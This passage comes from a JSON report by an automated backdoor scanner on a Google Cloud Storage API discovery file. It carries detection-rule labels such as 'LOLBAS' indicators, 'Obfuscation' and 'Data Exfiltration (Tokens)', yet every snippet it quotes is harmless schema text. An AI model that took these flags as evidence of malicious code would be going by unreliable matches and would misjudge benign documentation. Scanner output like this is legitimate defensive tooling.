                    "text": "    },\n    \"metageneration\": {\n     \"type\": \"string\",\n     \"description\": \"The version of the metadata for this object at this generation. Used for preconditions and for detecting changes in metadata. A metageneration number is only meaningful in the context of a particular generation of a particular object.\",\n     \"format\": \"int64\"\n    },\n    \"name\": {\n",
                    "rendered": {
                      "text": "    },\n    \"metageneration\": {\n     \"type\": \"string\",\n     \"description\": \"The version of the metadata for this object at this generation. Used for preconditions and for detecting changes in metadata. A metageneration number is only meaningful in the context of a particular generation of a particular object.\",\n     \"format\": \"int64\"\n    },\n    \"name\": {\n",
                      "markdown": "`    },\n    \"metageneration\": {\n     \"type\": \"string\",\n     \"description\": \"The version of the metadata for this object at this generation. Used for preconditions and for detecting changes in metadata. A metageneration number is only meaningful in the context of a particular generation of a particular object.\",\n     \"format\": \"int64\"\n    },\n    \"name\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 397,
                  "startColumn": 73,
                  "endLine": 397,
                  "endColumn": 82,
                  "snippet": {
                    "text": "    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For lists of bucket access control entries, this is always storage#bucketAccessControls.\",\n     \"default\": \"storage#bucketAccessControls\"\n    }\n   }\n",
                    "rendered": {
                      "text": "    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For lists of bucket access control entries, this is always storage#bucketAccessControls.\",\n     \"default\": \"storage#bucketAccessControls\"\n    }\n   }\n",
                      "markdown": "`    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For lists of bucket access control entries, this is always storage#bucketAccessControls.\",\n     \"default\": \"storage#bucketAccessControls\"\n    }\n   }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 351,
                  "startColumn": 64,
                  "endLine": 351,
                  "endColumn": 73,
                  "snippet": {
                    "text": "    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For bucket access control entries, this is always storage#bucketAccessControl.\",\n     \"default\": \"storage#bucketAccessControl\"\n    },\n    \"projectTeam\": {\n",
                    "rendered": {
                      "text": "    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For bucket access control entries, this is always storage#bucketAccessControl.\",\n     \"default\": \"storage#bucketAccessControl\"\n    },\n    \"projectTeam\": {\n",
                      "markdown": "`    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For bucket access control entries, this is always storage#bucketAccessControl.\",\n     \"default\": \"storage#bucketAccessControl\"\n    },\n    \"projectTeam\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 206,
                  "startColumn": 126,
                  "endLine": 206,
                  "endColumn": 130,
                  "snippet": {
                    "text": "           },\n           \"numNewerVersions\": {\n            \"type\": \"integer\",\n            \"description\": \"Relevant only for versioned objects. If the value is N, this condition is satisfied when there are at least N versions (including the live version) newer than this version of the object.\",\n            \"format\": \"int32\"\n           }\n          }\n",
                    "rendered": {
                      "text": "           },\n           \"numNewerVersions\": {\n            \"type\": \"integer\",\n            \"description\": \"Relevant only for versioned objects. If the value is N, this condition is satisfied when there are at least N versions (including the live version) newer than this version of the object.\",\n            \"format\": \"int32\"\n           }\n          }\n",
                      "markdown": "`           },\n           \"numNewerVersions\": {\n            \"type\": \"integer\",\n            \"description\": \"Relevant only for versioned objects. If the value is N, this condition is satisfied when there are at least N versions (including the live version) newer than this version of the object.\",\n            \"format\": \"int32\"\n           }\n          }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 706,
                  "startColumn": 57,
                  "endLine": 706,
                  "endColumn": 63,
                  "snippet": {
                    "text": "    },\n    \"md5Hash\": {\n     \"type\": \"string\",\n     \"description\": \"MD5 hash of the data; encoded using base64. For more information about using the MD5 hash, see Hashes and ETags: Best Practices.\"\n    },\n    \"mediaLink\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "    },\n    \"md5Hash\": {\n     \"type\": \"string\",\n     \"description\": \"MD5 hash of the data; encoded using base64. For more information about using the MD5 hash, see Hashes and ETags: Best Practices.\"\n    },\n    \"mediaLink\": {\n     \"type\": \"string\",\n",
                      "markdown": "`    },\n    \"md5Hash\": {\n     \"type\": \"string\",\n     \"description\": \"MD5 hash of the data; encoded using base64. For more information about using the MD5 hash, see Hashes and ETags: Best Practices.\"\n    },\n    \"mediaLink\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 670,
                  "startColumn": 90,
                  "endLine": 670,
                  "endColumn": 96,
                  "snippet": {
                    "text": "    },\n    \"crc32c\": {\n     \"type\": \"string\",\n     \"description\": \"CRC32c checksum, as described in RFC 4960, Appendix B; encoded using base64 in big-endian byte order. For more information about using the CRC32c checksum, see Hashes and ETags: Best Practices.\"\n    },\n    \"customerEncryption\": {\n     \"type\": \"object\",\n",
                    "rendered": {
                      "text": "    },\n    \"crc32c\": {\n     \"type\": \"string\",\n     \"description\": \"CRC32c checksum, as described in RFC 4960, Appendix B; encoded using base64 in big-endian byte order. For more information about using the CRC32c checksum, see Hashes and ETags: Best Practices.\"\n    },\n    \"customerEncryption\": {\n     \"type\": \"object\",\n",
                      "markdown": "`    },\n    \"crc32c\": {\n     \"type\": \"string\",\n     \"description\": \"CRC32c checksum, as described in RFC 4960, Appendix B; encoded using base64 in big-endian byte order. For more information about using the CRC32c checksum, see Hashes and ETags: Best Practices.\"\n    },\n    \"customerEncryption\": {\n     \"type\": \"object\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 3041,
                  "startColumn": 53,
                  "endLine": 3041,
                  "endColumn": 59,
                  "snippet": {
                    "text": "      },\n      \"sourceBucket\": {\n       \"type\": \"string\",\n       \"description\": \"Name of the bucket in which to find the source object.\",\n       \"required\": true,\n       \"location\": \"path\"\n      },\n",
                    "rendered": {
                      "text": "      },\n      \"sourceBucket\": {\n       \"type\": \"string\",\n       \"description\": \"Name of the bucket in which to find the source object.\",\n       \"required\": true,\n       \"location\": \"path\"\n      },\n",
                      "markdown": "`      },\n      \"sourceBucket\": {\n       \"type\": \"string\",\n       \"description\": \"Name of the bucket in which to find the source object.\",\n       \"required\": true,\n       \"location\": \"path\"\n      },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 2436,
                  "startColumn": 53,
                  "endLine": 2436,
                  "endColumn": 59,
                  "snippet": {
                    "text": "      },\n      \"sourceBucket\": {\n       \"type\": \"string\",\n       \"description\": \"Name of the bucket in which to find the source object.\",\n       \"required\": true,\n       \"location\": \"path\"\n      },\n",
                    "rendered": {
                      "text": "      },\n      \"sourceBucket\": {\n       \"type\": \"string\",\n       \"description\": \"Name of the bucket in which to find the source object.\",\n       \"required\": true,\n       \"location\": \"path\"\n      },\n",
                      "markdown": "`      },\n      \"sourceBucket\": {\n       \"type\": \"string\",\n       \"description\": \"Name of the bucket in which to find the source object.\",\n       \"required\": true,\n       \"location\": \"path\"\n      },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 906,
                  "startColumn": 582,
                  "endLine": 906,
                  "endColumn": 591,
                  "snippet": {
                    "text": "cial identifier that represents anyone who is authenticated with a Google account or a service account.  \\n- user:emailid  An email address that represents a specific account. For example, user:alice@gmail.com or user:joe@example.com.  \\n- serviceAccount:emailid  An email address that represents a service account. For example,  serviceAccount:my-other-app@appspot.gserviceaccount.com .  \\n- group:emailid  An email address that represents a Google group. For example, group:admins@example.com.  \\n- domain:domain  A Google Apps domain name that represents all the users of that domain. For example, doma",
                    "rendered": {
                      "text": "cial identifier that represents anyone who is authenticated with a Google account or a service account.  \\n- user:emailid  An email address that represents a specific account. For example, user:alice@gmail.com or user:joe@example.com.  \\n- serviceAccount:emailid  An email address that represents a service account. For example,  serviceAccount:my-other-app@appspot.gserviceaccount.com .  \\n- group:emailid  An email address that represents a Google group. For example, group:admins@example.com.  \\n- domain:domain  A Google Apps domain name that represents all the users of that domain. For example, doma",
                      "markdown": "`cial identifier that represents anyone who is authenticated with a Google account or a service account.  \\n- user:emailid  An email address that represents a specific account. For example, user:alice@gmail.com or user:joe@example.com.  \\n- serviceAccount:emailid  An email address that represents a service account. For example,  serviceAccount:my-other-app@appspot.gserviceaccount.com .  \\n- group:emailid  An email address that represents a Google group. For example, group:admins@example.com.  \\n- domain:domain  A Google Apps domain name that represents all the users of that domain. For example, doma`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 906,
                  "startColumn": 368,
                  "endLine": 906,
                  "endColumn": 377,
                  "snippet": {
                    "text": "may assume the provided role. Recognized identifiers are as follows:  \\n- allUsers  A special identifier that represents anyone on the internet; with or without a Google account.  \\n- allAuthenticatedUsers  A special identifier that represents anyone who is authenticated with a Google account or a service account.  \\n- user:emailid  An email address that represents a specific account. For example, user:alice@gmail.com or user:joe@example.com.  \\n- serviceAccount:emailid  An email address that represents a service account. For example,  serviceAccount:my-other-app@appspot.gserviceaccount.com .  \\n- ",
                    "rendered": {
                      "text": "may assume the provided role. Recognized identifiers are as follows:  \\n- allUsers  A special identifier that represents anyone on the internet; with or without a Google account.  \\n- allAuthenticatedUsers  A special identifier that represents anyone who is authenticated with a Google account or a service account.  \\n- user:emailid  An email address that represents a specific account. For example, user:alice@gmail.com or user:joe@example.com.  \\n- serviceAccount:emailid  An email address that represents a service account. For example,  serviceAccount:my-other-app@appspot.gserviceaccount.com .  \\n- ",
                      "markdown": "`may assume the provided role. Recognized identifiers are as follows:  \\n- allUsers  A special identifier that represents anyone on the internet; with or without a Google account.  \\n- allAuthenticatedUsers  A special identifier that represents anyone who is authenticated with a Google account or a service account.  \\n- user:emailid  An email address that represents a specific account. For example, user:alice@gmail.com or user:joe@example.com.  \\n- serviceAccount:emailid  An email address that represents a service account. For example,  serviceAccount:my-other-app@appspot.gserviceaccount.com .  \\n- `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 768,
                  "startColumn": 37,
                  "endLine": 768,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    },\n    \"updated\": {\n     \"type\": \"string\",\n     \"description\": \"The modification time of the object metadata in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    }\n   }\n",
                    "rendered": {
                      "text": "    },\n    \"updated\": {\n     \"type\": \"string\",\n     \"description\": \"The modification time of the object metadata in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    }\n   }\n",
                      "markdown": "`    },\n    \"updated\": {\n     \"type\": \"string\",\n     \"description\": \"The modification time of the object metadata in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    }\n   }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 763,
                  "startColumn": 33,
                  "endLine": 763,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    },\n    \"timeDeleted\": {\n     \"type\": \"string\",\n     \"description\": \"The deletion time of the object in RFC 3339 format. Will be returned if and only if this version of the object has been deleted.\",\n     \"format\": \"date-time\"\n    },\n    \"updated\": {\n",
                    "rendered": {
                      "text": "    },\n    \"timeDeleted\": {\n     \"type\": \"string\",\n     \"description\": \"The deletion time of the object in RFC 3339 format. Will be returned if and only if this version of the object has been deleted.\",\n     \"format\": \"date-time\"\n    },\n    \"updated\": {\n",
                      "markdown": "`    },\n    \"timeDeleted\": {\n     \"type\": \"string\",\n     \"description\": \"The deletion time of the object in RFC 3339 format. Will be returned if and only if this version of the object has been deleted.\",\n     \"format\": \"date-time\"\n    },\n    \"updated\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 758,
                  "startColumn": 33,
                  "endLine": 758,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    },\n    \"timeCreated\": {\n     \"type\": \"string\",\n     \"description\": \"The creation time of the object in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    },\n    \"timeDeleted\": {\n",
                    "rendered": {
                      "text": "    },\n    \"timeCreated\": {\n     \"type\": \"string\",\n     \"description\": \"The creation time of the object in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    },\n    \"timeDeleted\": {\n",
                      "markdown": "`    },\n    \"timeCreated\": {\n     \"type\": \"string\",\n     \"description\": \"The creation time of the object in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    },\n    \"timeDeleted\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 670,
                  "startColumn": 89,
                  "endLine": 670,
                  "endColumn": 97,
                  "snippet": {
                    "text": "    },\n    \"crc32c\": {\n     \"type\": \"string\",\n     \"description\": \"CRC32c checksum, as described in RFC 4960, Appendix B; encoded using base64 in big-endian byte order. For more information about using the CRC32c checksum, see Hashes and ETags: Best Practices.\"\n    },\n    \"customerEncryption\": {\n     \"type\": \"object\",\n",
                    "rendered": {
                      "text": "    },\n    \"crc32c\": {\n     \"type\": \"string\",\n     \"description\": \"CRC32c checksum, as described in RFC 4960, Appendix B; encoded using base64 in big-endian byte order. For more information about using the CRC32c checksum, see Hashes and ETags: Best Practices.\"\n    },\n    \"customerEncryption\": {\n     \"type\": \"object\",\n",
                      "markdown": "`    },\n    \"crc32c\": {\n     \"type\": \"string\",\n     \"description\": \"CRC32c checksum, as described in RFC 4960, Appendix B; encoded using base64 in big-endian byte order. For more information about using the CRC32c checksum, see Hashes and ETags: Best Practices.\"\n    },\n    \"customerEncryption\": {\n     \"type\": \"object\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 445,
                  "startColumn": 70,
                  "endLine": 445,
                  "endColumn": 77,
                  "snippet": {
                    "text": "    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"Identifies this as a notification channel used to watch for changes to a resource. Value: the fixed string \\\"api#channel\\\".\",\n     \"default\": \"api#channel\"\n    },\n    \"params\": {\n",
                    "rendered": {
                      "text": "    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"Identifies this as a notification channel used to watch for changes to a resource. Value: the fixed string \\\"api#channel\\\".\",\n     \"default\": \"api#channel\"\n    },\n    \"params\": {\n",
                      "markdown": "`    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"Identifies this as a notification channel used to watch for changes to a resource. Value: the fixed string \\\"api#channel\\\".\",\n     \"default\": \"api#channel\"\n    },\n    \"params\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 436,
                  "startColumn": 29,
                  "endLine": 436,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    },\n    \"expiration\": {\n     \"type\": \"string\",\n     \"description\": \"Date and time of notification channel expiration, expressed as a Unix timestamp, in milliseconds. Optional.\",\n     \"format\": \"int64\"\n    },\n    \"id\": {\n",
                    "rendered": {
                      "text": "    },\n    \"expiration\": {\n     \"type\": \"string\",\n     \"description\": \"Date and time of notification channel expiration, expressed as a Unix timestamp, in milliseconds. Optional.\",\n     \"format\": \"int64\"\n    },\n    \"id\": {\n",
                      "markdown": "`    },\n    \"expiration\": {\n     \"type\": \"string\",\n     \"description\": \"Date and time of notification channel expiration, expressed as a Unix timestamp, in milliseconds. Optional.\",\n     \"format\": \"int64\"\n    },\n    \"id\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 428,
                  "startColumn": 50,
                  "endLine": 428,
                  "endColumn": 57,
                  "snippet": {
                    "text": "  \"Channel\": {\n   \"id\": \"Channel\",\n   \"type\": \"object\",\n   \"description\": \"An notification channel used to watch for resource changes.\",\n   \"properties\": {\n    \"address\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "  \"Channel\": {\n   \"id\": \"Channel\",\n   \"type\": \"object\",\n   \"description\": \"An notification channel used to watch for resource changes.\",\n   \"properties\": {\n    \"address\": {\n     \"type\": \"string\",\n",
                      "markdown": "`  \"Channel\": {\n   \"id\": \"Channel\",\n   \"type\": \"object\",\n   \"description\": \"An notification channel used to watch for resource changes.\",\n   \"properties\": {\n    \"address\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 305,
                  "startColumn": 124,
                  "endLine": 305,
                  "endColumn": 133,
                  "snippet": {
                    "text": "      },\n      \"notFoundPage\": {\n       \"type\": \"string\",\n       \"description\": \"If the requested object path is missing, and any mainPageSuffix object is missing, if applicable, the service will return the named object from this bucket as the content for a 404 Not Found result.\"\n      }\n     }\n    }\n",
                    "rendered": {
                      "text": "      },\n      \"notFoundPage\": {\n       \"type\": \"string\",\n       \"description\": \"If the requested object path is missing, and any mainPageSuffix object is missing, if applicable, the service will return the named object from this bucket as the content for a 404 Not Found result.\"\n      }\n     }\n    }\n",
                      "markdown": "`      },\n      \"notFoundPage\": {\n       \"type\": \"string\",\n       \"description\": \"If the requested object path is missing, and any mainPageSuffix object is missing, if applicable, the service will return the named object from this bucket as the content for a 404 Not Found result.\"\n      }\n     }\n    }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 301,
                  "startColumn": 67,
                  "endLine": 301,
                  "endColumn": 76,
                  "snippet": {
                    "text": "     \"properties\": {\n      \"mainPageSuffix\": {\n       \"type\": \"string\",\n       \"description\": \"If the requested object path is missing, the service will ensure the path has a trailing '/', append this suffix, and attempt to retrieve the resulting object. This allows the creation of index.html objects to represent directory pages.\"\n      },\n      \"notFoundPage\": {\n       \"type\": \"string\",\n",
                    "rendered": {
                      "text": "     \"properties\": {\n      \"mainPageSuffix\": {\n       \"type\": \"string\",\n       \"description\": \"If the requested object path is missing, the service will ensure the path has a trailing '/', append this suffix, and attempt to retrieve the resulting object. This allows the creation of index.html objects to represent directory pages.\"\n      },\n      \"notFoundPage\": {\n       \"type\": \"string\",\n",
                      "markdown": "`     \"properties\": {\n      \"mainPageSuffix\": {\n       \"type\": \"string\",\n       \"description\": \"If the requested object path is missing, the service will ensure the path has a trailing '/', append this suffix, and attempt to retrieve the resulting object. This allows the creation of index.html objects to represent directory pages.\"\n      },\n      \"notFoundPage\": {\n       \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 297,
                  "startColumn": 76,
                  "endLine": 297,
                  "endColumn": 85,
                  "snippet": {
                    "text": "    },\n    \"website\": {\n     \"type\": \"object\",\n     \"description\": \"The bucket's website configuration, controlling how the service behaves when accessing bucket contents as a web site. See the Static Website Examples for more information.\",\n     \"properties\": {\n      \"mainPageSuffix\": {\n       \"type\": \"string\",\n",
                    "rendered": {
                      "text": "    },\n    \"website\": {\n     \"type\": \"object\",\n     \"description\": \"The bucket's website configuration, controlling how the service behaves when accessing bucket contents as a web site. See the Static Website Examples for more information.\",\n     \"properties\": {\n      \"mainPageSuffix\": {\n       \"type\": \"string\",\n",
                      "markdown": "`    },\n    \"website\": {\n     \"type\": \"object\",\n     \"description\": \"The bucket's website configuration, controlling how the service behaves when accessing bucket contents as a web site. See the Static Website Examples for more information.\",\n     \"properties\": {\n      \"mainPageSuffix\": {\n       \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 282,
                  "startColumn": 37,
                  "endLine": 282,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    },\n    \"updated\": {\n     \"type\": \"string\",\n     \"description\": \"The modification time of the bucket in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    },\n    \"versioning\": {\n",
                    "rendered": {
                      "text": "    },\n    \"updated\": {\n     \"type\": \"string\",\n     \"description\": \"The modification time of the bucket in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    },\n    \"versioning\": {\n",
                      "markdown": "`    },\n    \"updated\": {\n     \"type\": \"string\",\n     \"description\": \"The modification time of the bucket in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    },\n    \"versioning\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 277,
                  "startColumn": 33,
                  "endLine": 277,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    },\n    \"timeCreated\": {\n     \"type\": \"string\",\n     \"description\": \"The creation time of the bucket in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    },\n    \"updated\": {\n",
                    "rendered": {
                      "text": "    },\n    \"timeCreated\": {\n     \"type\": \"string\",\n     \"description\": \"The creation time of the bucket in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    },\n    \"updated\": {\n",
                      "markdown": "`    },\n    \"timeCreated\": {\n     \"type\": \"string\",\n     \"description\": \"The creation time of the bucket in RFC 3339 format.\",\n     \"format\": \"date-time\"\n    },\n    \"updated\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
